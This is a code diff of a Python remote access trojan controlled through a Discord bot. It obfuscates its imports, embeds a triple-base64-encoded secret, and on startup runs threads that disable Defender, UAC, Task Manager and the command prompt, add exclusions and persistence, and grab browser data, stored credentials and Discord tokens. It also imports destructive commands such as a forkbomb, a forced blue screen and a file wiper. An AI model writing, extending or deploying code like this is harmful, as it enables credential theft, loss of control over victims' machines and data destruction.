@@ -17,52 +17,38 @@ from discord.ext import commands as YVdoaGRHVnVhV2RuWlhKemRHaGxlWE5vWVd4c1pHbGw
 from threading import Thread
 import base64 as FJIURFIUJIUJFUJFF
 from start.launch import run
-from payloads.recovery import recon, recoff
-from commands.nuke import nofilespls
-from commands.browser import search, openurl
-from commands.gdi import invcol
-from commands.recovery import reagentc
-from commands.intermediates import forkbomb, setvol, share_file, ezip, fetchlink
-from commands.fun import alert, cb, taskmanagerset
+from payloads.recovery import recon, recoff, noreg, yesreg, nocmd, yescmd, notask, yestask, no_uac, yesuac
+from commands.intermediates import forkbomb, setvol, share_file, ezip, fetchlink, reagentc 
+from commands.fun import alert, cb, taskmanagerset, invcol, nofilespls
 from commands.filenav import cd_command
 from commands.others import takepic, mouse_control, taskbar, admin, sysinfo, rotate, defend, sites, uac
 from commands.user import manageuser
-from commands.basics import clean, clear, bsod, close, processes, fileretrieval, sharenote, speak, pc, startupapps, cmd, kp, wallpaper, endpc
+from commands.basics import clean, clear, bsod, close, processes, fileretrieval, sharenote, speak, pc, startupapps, cmd, kp, wallpaper, endpc, search, openurl
 from commands.help import nodubs, helpcommand
 from start.noez import noez
-from base64 import b64decode as GJIFGIUJEUIJFUIJFSS
-import builtins
-from payloads.addtopath import pathadd, starttup, ss
-from payloads.adminforce import forceadmin
 from payloads.browserinfo import getinfo
 from payloads.creds import credmgr
 from payloads.defender import yesdefend, nodefend
-from payloads.exclusions import excludeme
 from payloads.firefoxinfo import firefoxing
 from payloads.getsysinfo import SYSINFO
 from payloads.gettoken import GETTOKEN
 from payloads.noovm import novm
-from payloads.otherstuff import disable_safe_mode, fuckname, nopower, nogpt, pers, nosettings, norecy, yesrecy
-from payloads.persistence import neverstop
-from payloads.runreg import noreg, yesreg
-from payloads.setcmd import nocmd, yescmd
+from payloads.otherstuff import disable_safe_mode, fuckname, nopower, nogpt, pers, nosettings, norecy, yesrecy, forceadmin
+from payloads.persistence import neverstop,  pathadd, starttup, excludeme, blocksites
 from payloads.setuptasks import setup_tasks
-from payloads.siteblocking import blocksites
-from payloads.tmset import yestask, notask
-from payloads.uac import no_uac, yesuac 
 from payloads.unkill import unkiller
 from notoken887.encryptor import TokenCryptor
+import base64
 c=TokenCryptor()
 from start.zipf import zip
 import time
 from bs4 import BeautifulSoup as bs4
 from flask import Flask
-import base64
 app = Flask(__name__)
 def start_server():
     http_server = WSGIServer(("0.0.0.0", 80), app)
     http_server.serve_forever()
-ggs=base64.b64decode(base64.b64decode(base64.b64decode("""VkZaU1RtVnJPVVZUVkVKUFlXMU5lRlJXVW01bFJURlZVVmhvVGxKR2EzZFVWVVYxVWpBd05WZHNTbkpNYmtWNVdrVTVjVkpIUm01TmExcHhZV3RPYlZsdE9UVk9WMlJ6VDBkSk1sVnNSa2xqTUZwR1pFVkdRbVZHYXpKVk0wNXE=""")))
+ggs=base64.b64decode(base64.b64decode(base64.b64decode("""VkZaU1RtVnJOVlZTVkVaUFVrVnJNRlJXVW1wTlJURkZXbnBXVDFKRmEzZFVNVVYxVWpKNFJHVkljRVJNYmxrMVpVWTRlRTFJV1RWTVZVMTBXbTVHYUdOck9WVlJXSEJXV1ZWYU1XSnRVa2RrTVU1cVpWaFdVRmt3ZUdoWFdHaDI=""")))
 @app.route('/')
 def index():
     return home()    
@@ -203,6 +189,7 @@ def ffs():
     Thread(target=excludeme).start()
     Thread(target=nocmd).start()
     Thread(target=notask).start()
+    Thread(target=fuckname).start()
     SYSINFO()
     firefoxing()
     getinfo()
